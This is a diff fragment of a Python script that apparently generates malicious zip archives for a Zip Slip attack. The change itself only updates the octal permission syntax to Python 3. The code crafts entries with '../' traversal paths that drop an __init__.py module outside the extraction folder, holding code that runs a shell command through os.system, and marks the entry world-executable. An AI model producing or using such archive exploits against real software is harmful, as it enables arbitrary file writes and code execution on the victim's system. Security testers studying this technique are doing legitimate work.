@@ -15,5 +15,5 @@ for d in directories:
     z_info = zipfile.ZipInfo(r"../"+d+"/__init__.py")
     z_file = zipfile.ZipFile(name, mode="w") # "/home/swissky/Bureau/"+
     z_file.writestr(z_info, "import os;print 'Shell';os.system('ls');")
-    z_info.external_attr = 0777 << 16L
+    z_info.external_attr = 0o777 << 16
     z_file.close()
